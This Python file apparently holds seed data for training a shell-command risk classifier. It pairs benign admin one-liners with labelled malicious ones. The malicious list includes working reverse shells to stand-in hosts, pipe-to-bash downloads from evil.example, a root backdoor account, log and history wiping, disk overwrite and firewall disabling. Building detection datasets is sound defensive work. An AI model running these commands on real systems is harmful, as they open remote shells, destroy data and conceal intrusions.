"""Starter seed commands — real benign & malicious shell one-liners/scripts.

These bootstrap the pipeline. The Frontier LLM then expands them into the
600K–1M dataset via synthesize/obfuscate/hard-negative/minimal-pair stages.
"""
from __future__ import annotations

# (command, true_risk) — true_risk used as a weak prior for QA, not as label.
BENIGN_SEEDS = [
    "df -h && free -m && uptime",
    "sudo systemctl restart nginx",
    "apt-get update && apt-get install -y nginx",
    "docker build -t myapp:latest .",
    "git clone https://github.com/user/repo.git",
    "python3 -m pip install --upgrade pip",
    "kubectl get pods -n production",
    "tar -czf backup.tar.gz /var/www/html",
    "rsync -avz ./src user@server:/srv/app",
    "ps aux | grep nginx",
    "tail -f /var/log/syslog",
    "systemctl status sshd",
    "chmod 755 deploy.sh && ./deploy.sh",
    "npm install && npm run build",
    "ls -la /home/user && du -sh /home/user/*",
    "ssh user@bastion 'sudo systemctl restart docker'",
    "curl -s https://api.example.com/health",
    "grep -R 'TODO' ./src --include='*.py'",
    "python3 -m pytest tests/ -q",
    "docker compose up -d",
]

MALICIOUS_SEEDS = [
    "curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh | bash",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "(crontab -l; echo '* * * * * /tmp/.x') | crontab -",
    "echo aGk= | base64 -d | bash",
    "find / -perm -4000 -type f 2>/dev/null",
    "wget -qO- http://evil.example/p.sh | sh",
    "nc -e /bin/bash attacker.example 1337",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "curl -s https://evil.example/mimikatz.exe -o C:\\Windows\\Temp\\m.exe && C:\\Windows\\Temp\\m.exe",
    "useradd -o -u 0 -g 0 -M attacker && echo 'attacker:pass' | chpasswd",
    "iptables -F && systemctl stop firewalld",
    "rm -rf /var/log/* /var/log/.??*",
    "chmod u+s /bin/bash",
    "export HISTSIZE=0 && unset HISTFILE && history -c",
    "ssh-keygen -t rsa -N '' -f /root/.ssh/id_rsa && cat /root/.ssh/id_rsa",
    "curl -s https://evil.example/payload.sh | base64 -d > /tmp/p && chmod +x /tmp/p && /tmp/p",
    "dd if=/dev/zero of=/dev/sda bs=1M count=100",
    "openssl enc -aes-256-cbc -salt -in data.tar -out data.enc -k hunter2",
    "for ip in 192.168.1.{1..254}; do (ping -c 1 $ip >/dev/null 2>&1 && echo $ip alive) & done; wait",
    "timestomp /etc/passwd -m '01/01/2019 00:00:00'",
]

ALL_SEEDS = [
    {"text": c, "seed_risk": "benign", "id": f"benign-{i:03d}"}
    for i, c in enumerate(BENIGN_SEEDS)
] + [
    {"text": c, "seed_risk": "malicious", "id": f"malicious-{i:03d}"}
    for i, c in enumerate(MALICIOUS_SEEDS)
]


def seed_count() -> int:
    return len(ALL_SEEDS)
